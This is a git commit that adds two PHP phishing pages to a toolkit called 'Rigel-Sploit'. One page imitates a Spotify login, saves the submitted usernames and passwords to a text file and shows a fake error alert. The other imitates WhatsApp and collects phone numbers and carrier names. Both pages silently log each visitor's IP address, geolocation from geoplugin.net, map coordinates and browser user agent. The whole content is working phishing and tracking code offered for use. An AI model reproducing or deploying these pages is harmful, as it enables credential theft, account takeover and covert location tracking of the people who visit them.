26eebfd62e933570e058319ccf31666e31e725b9
tg-bit <62854043+tg-bit@users.noreply.github.com>
2020-05-01 12:27:37 +0300

    Rigel-Sploit
    v0.1

---
+++ Rigel-Sploit/Sites/spofity/index.php
@@ -0,0 +1,227 @@
+<?php  
+date_default_timezone_set('Europe/Istanbul');
+if (isset($_POST['login']) && isset($_POST['password'])) {
+
+$ac = fopen("kayit.txt","a+");
+$username = $_POST['login'];
+$password = $_POST['password'];
+$userlar = ("\n Username : ".$username."\n Password : ".$password."\n__________________ \n");
+fwrite($ac,$userlar);
+fclose($ac);
+echo "<script>alert('Kullanıcı Adınız veya Şifrenizi kontrol ediniz!');</script>";
+}
+
+else{
+
+function GetIP(){
+ if(getenv("HTTP_CLIENT_IP")) {
+ $ip = getenv("HTTP_CLIENT_IP");
+ } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
+ $ip = getenv("HTTP_X_FORWARDED_FOR");
+ if (strstr($ip, ',')) {
+ $tmp = explode (',', $ip);
+ $ip = trim($tmp[0]);
+ }
+ } else {
+ $ip = getenv("REMOTE_ADDR");
+ }
+ return $ip;
+}
+
+$ip = GetIP();
+
+
+$tarih =" Tarih : ".date('d/m/Y  H:i');
+
+$Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip); 
+$adress = $Geo_Plugin_XML->geoplugin_request; 
+$ulke = $Geo_Plugin_XML->geoplugin_countryName;
+$bolge = $Geo_Plugin_XML->geoplugin_region;
+$kita = $Geo_Plugin_XML->geoplugin_continentCode;
+$ulkekodu = $Geo_Plugin_XML->geoplugin_countryCode;
+$sehir = $Geo_Plugin_XML->geoplugin_city;
+$plaka = $Geo_Plugin_XML->geoplugin_regionCode;
+$enlem = $Geo_Plugin_XML->geoplugin_latitude;
+$boylam = $Geo_Plugin_XML->geoplugin_longitude;
+$tarayici = $_SERVER['HTTP_USER_AGENT']; 
+
+$maps = "https://www.google.com/maps/place/".$enlem.",".$boylam."/@".$enlem.",".$boylam.",16z";
+$yamanefkar["0"] = " Ip Adresi : ".$adress;
+$yamanefkar["1"] = " Ulke : ".$ulke; 
+$yamanefkar["2"] = " Bolge : ".$bolge;
+$yamanefkar["3"] = " Kita : ".$kita;
+$yamanefkar["4"] = " Ulke Kodu : ".$ulkekodu;
+$yamanefkar["5"] = " Sehir : ".$sehir;
+$yamanefkar["6"] = " Plaka : ".$plaka;
+$yamanefkar["7"] = " Enlem : ".$enlem;
+$yamanefkar["8"] = " Boylam : ".$boylam;
+$yamanefkar["9"] = " Google Maps : ".$maps;
+$yamanefkar["10"] = " Tarayıcı : ".$tarayici; 
+
+
+$ac = fopen("kayit.txt","a+");
+
+$userlar = ("\n __________________ \n".$tarih."\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n!--VERİLER--!\n");
+fwrite($ac,$userlar);
+fclose($ac);
+sleep(2);
+
+
+
+
+}
+
+
+ ?>
+
+
+
+
+
+<!DOCTYPE html>
+<html>
+<style type="text/css">
+
+body{
+
+  position:absolute;
+  width:100%;
+  height:100%;
+  margin:0;
+  padding:0;
+
+
+
+    background: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRW7_jqiKGNXw0rwdaS0JKML63-oobfZlMtyfvyExR3aaQV9xWO") no-repeat center center fixed; 
+    -webkit-background-size: cover;
+    -moz-background-size: cover;
+    -o-background-size: cover;
+    background-size: cover;
+}
+h1{
+  margin:0 0 .5em 0;
+  padding:0;
+  color:#fff;
+  font-family:helvetica;
+  font-size:30px;
+  font-weight:100;
+  letter-spacing:1px;
+  text-align:center;
+	text-shadow: 0 1px 2px rgba(0,0,0,1);}
+section{
+  position:relative;
+  top:50%;
+  width:300px;
+  max-width:96%;
+  margin:0 auto;
+  padding-top:120px;
+	-webkit-transform:translateY(-50%);
+	-ms-transform:translateY(-50%);
+	transform:translateY(-50%);
+  background-image:url(http://www.matthewlewicki.com/codefest/images/spotify-logo-small.png);
+  background-position:top center;
+  background-repeat:no-repeat;
+  background-size:100px;}
+form{
+  padding:0;
+  border-radius: 4px;
+  background-color:rgba(255,255,255,.75);
+  box-shadow: 0 2px 5px 0px rgba(38,38,38,0.5);}
+fieldset{
+  display: block;
+  width:100%;
+	margin:0 auto;
+  padding:1em 0 1em 0;
+  border: none;
+  border-bottom: 1px solid #ccc;}
+fieldset:first-child{
+  margin-bottom:0;}
+fieldset:last-child{
+  border-bottom: none;
+  margin-top:0;
+  padding:0;}
+input{
+  display:block;
+  width: 90%;
+  height:20px;
+  margin:0 auto;
+  padding: 5px 0;
+  color: #81b71a;
+  border: 1px solid #ccc;
+  text-align:center;
+  -webkit-border-radius: 4px;
+  -moz-border-radius: 4px;
+  -o-border-radius: 4px;
+  border-radius: 4px;}
+input[type="submit"]{
+  display: block;
+	-webkit-appearance: none;
+	-moz-appearance: none;
+	width:100%;
+  max-width:100% !important;
+  height:3em;
+	margin: 0 auto;
+	padding: 7px 5px 5px 5px;
+	background-color:#262626;
+	font-family: helvetica, arial, sans-serif;
+	font-size: 1em;
+	text-transform: uppercase;
+	text-align:center;
+  color:#81b71a;
+	-webkit-border-radius: 4px;
+	-moz-border-radius: 4px;
+  border:none;
+	border-radius: 0 0 4px 4px;
+	-webkit-transition: all 0.5s ease-out;
+	-moz-transition: all 0.5s ease-out;
+	-o-transition: all 0.5s ease-out;
+	transition: all 0.5s ease-out;}
+input[type="submit"]:hover{
+  background-color: #333;
+	text-shadow:none;}
+input::-webkit-input-placeholder{
+	-webkit-transition: all 0.5s ease;
+	-moz-transition: all 0.5s ease;
+	-o-transition: all 0.5s ease;
+	transition: all 0.5s ease;}
+input:hover::-webkit-input-placeholder{
+  color:#81b71a;}
+input:focus::-webkit-input-placeholder{
+  opacity:0;}
+input[type="text"]:focus,input[type="text"]:active,[type="password"]:focus,input[type="password"]:active{
+  outline:0;
+ 	-webkit-appearance: none;
+	-moz-appearance: none; 
+  border-image:none;
+	-moz-box-shadow: 0 0 20px rgba(129,183,26,0.5);
+	box-shadow: 0 0 20px rgba(129,183,26,0.5);
+	-webkit-animation: shadow-pulse 3s infinite ease-in-out;}
+@-webkit-keyframes shadow-pulse {
+  0% {-webkit-box-shadow: 0 0 20px rgba(129,183,26,0);}
+  50% {-webkit-box-shadow: 0 0 20px rgba(129,183,26,1);}
+  100% {-webkit-box-shadow: 0 0 20px rgba(129,183,26,0);}}
+</style>
+<head>
+		<meta name="author" content="Matthew Lewicki">
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+		<meta charset="UTF-8">
+		<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+		<title>Spotify Login</title>
+	</head>
+	<body>
+		<section>
+       <h1>Welcome to Spotify</h1>
+			<form method="post" name="loggin" action="#" id="loggin">
+				<fieldset>
+					<input id="username" name="login" type="text" placeholder="Username">
+				</fieldset>
+				<fieldset>
+					<input id="password" name="password" type="password" placeholder="Password">
+				</fieldset>
+				<fieldset>
+					<input type="submit" name='submit' value="Sign In" />
+				</fieldset>
+			</form>
+		</section>
+	</body>
+</html>
---
+++ Rigel-Sploit/Sites/whatsapp/index.php
@@ -0,0 +1,121 @@
+<?php 
+date_default_timezone_set('Europe/Istanbul');
+
+if (isset($_GET["id"])) {
+	echo "<script>alert('İşleminiz gerçekleşti.');</script>";
+}
+
+else{
+function GetIP(){
+ if(getenv("HTTP_CLIENT_IP")) {
+ $ip = getenv("HTTP_CLIENT_IP");
+ } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
+ $ip = getenv("HTTP_X_FORWARDED_FOR");
+ if (strstr($ip, ',')) {
+ $tmp = explode (',', $ip);
+ $ip = trim($tmp[0]);
+ }
+ } else {
+ $ip = getenv("REMOTE_ADDR");
+ }
+ return $ip;
+}
+
+$ip = GetIP();
+
+
+$tarih =" Tarih : ".date('d/m/Y  H:i');
+
+
+$Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip); 
+
+$adress = $Geo_Plugin_XML->geoplugin_request; 
+$ulke = $Geo_Plugin_XML->geoplugin_countryName;
+$bolge = $Geo_Plugin_XML->geoplugin_region;
+$kita = $Geo_Plugin_XML->geoplugin_continentCode;
+$ulkekodu = $Geo_Plugin_XML->geoplugin_countryCode;
+$sehir = $Geo_Plugin_XML->geoplugin_city;
+$plaka = $Geo_Plugin_XML->geoplugin_regionCode;
+$enlem = $Geo_Plugin_XML->geoplugin_latitude;
+$boylam = $Geo_Plugin_XML->geoplugin_longitude;
+$tarayici = $_SERVER['HTTP_USER_AGENT']; 
+
+$maps = "https://www.google.com/maps/place/".$enlem.",".$boylam."/@".$enlem.",".$boylam.",16z";
+$yamanefkar["0"] = " Ip Adresi : ".$adress;
+$yamanefkar["1"] = " Ulke : ".$ulke; 
+$yamanefkar["2"] = " Bolge : ".$bolge;
+$yamanefkar["3"] = " Kita : ".$kita;
+$yamanefkar["4"] = " Ulke Kodu : ".$ulkekodu;
+$yamanefkar["5"] = " Sehir : ".$sehir;
+$yamanefkar["6"] = " Plaka : ".$plaka;
+$yamanefkar["7"] = " Enlem : ".$enlem;
+$yamanefkar["8"] = " Boylam : ".$boylam;
+$yamanefkar["9"] = " Google Maps : ".$maps;
+$yamanefkar["10"] = " Tarayıcı : ".$tarayici; 
+
+
+$ac = fopen("kayit.txt","a+");
+
+$userlar = ("\n __________________ \n".$tarih."\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n!--VERİLER--!\n");
+fwrite($ac,$userlar);
+fclose($ac);
+sleep(1);
+
+}
+
+ ?>
+
+<!doctype html>
+<html lang="tr">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1200px-WhatsApp.svg.png">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+    <title>Hoş Geldiniz</title>
+  </head>
+  <body style="background-image: url('http://www.allwhitebackground.com/images/7/WhatsApp-Background-High-Quality-Image.jpg');  background-repeat: no-repeat;
+  background-attachment: fixed;
+  background-position: center;height: 100%;width: 100%;" bgcolor="black">
+  	<div class="container ">
+  		<div class="row mt-5">
+  		<div class="col-md-12 col-12">
+  			<center>
+  			<div class="card bg-dark col-12"  style="opacity: 0.9">
+  				<div class="card-body">
+  					<p class="text-danger font-weight-bold">Lütfen bilgilerinizi eksiksiz giriniz!</p>
+  					<form method="POST" action="code.php">
+  						<div class="form-row col-12">
+  						<div class="form-group col-md-12 text-white pt-5">
+  							<select class="form-control" required="">
+  								<option>Turkcell</option>
+  								<option>Vodofone</option>
+  								<option>Turk Telekom</option>
+  							</select>
+  							</div>
+  						</div>
+  						<div class="form-row">
+  							<div class="form-group col-md-12 text-white pt-1 ml-1">
+  								<label>Telefon Numarası</label>
+  								<input type="text" name="telnumber" class="form-control input-sm" required="" placeholder="+90" value="" minlength="11" maxlength="13" > 
+  							</div>
+  							<div class="form-row col-12">
+  								<button type="submit" class="btn btn-outline-success  btn-block ">Devam</button>
+  							</div>
+  							
+  						</div>
+  					</form>
+  				</div>
+  			</div>
+  		</div>	
+  		</center>
+  		</div>
+  	</div>
+
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+  </body>
+</html>
